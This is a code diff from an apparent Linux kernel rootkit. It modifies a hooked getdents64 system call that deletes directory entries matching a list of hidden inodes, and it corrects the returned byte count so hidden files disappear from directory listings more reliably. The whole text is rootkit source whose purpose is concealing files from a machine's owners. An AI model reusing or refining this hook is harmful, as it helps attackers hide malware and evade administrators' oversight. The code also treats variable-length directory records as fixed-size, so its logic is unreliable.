@@ -141,7 +141,7 @@ getdents64_ptr orig_getdents64;
 asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                                  unsigned int count)
 {
-	int actual_result, number_dirps, i;
+	int actual_result, hacked_result, number_dirps, i;
 	struct hidden_file *ptr;
 	struct linux_dirent64 *kdirp;
 
@@ -157,15 +157,18 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 
 	// run real getdents64 and check result for files to hide
 	actual_result = (*orig_getdents64)(fd,dirp,count);
+	hacked_result = actual_result;
 	if (actual_result > 0) { // actually read some bytes
 		printk(KERN_INFO "Checking dirp\n");
 		number_dirps = actual_result / sizeof(struct linux_dirent64);
 		for (i = 0; i < number_dirps; i++) {
+			printk(KERN_INFO "How many dirps? %i\n",number_dirps);
 			list_for_each_entry(ptr,&hidden_files,list) {
 				if ((kdirp + i)->d_ino == ptr->inode) {
 					printk(KERN_INFO "Found file to hide\n");
 					memcpy(kdirp + i,kdirp + i + 1,
 					       sizeof(struct linux_dirent64)*(number_dirps-i-1));
+					hacked_result -= sizeof(struct linux_dirent64);
 				}
 			}
 		}
@@ -178,8 +181,8 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		return -1;
 	kfree(kdirp);
 
-	// return actual result
-	return actual_result;
+	// return number of bytes read
+	return hacked_result;
 }
 
 int rootkit_init(void) {
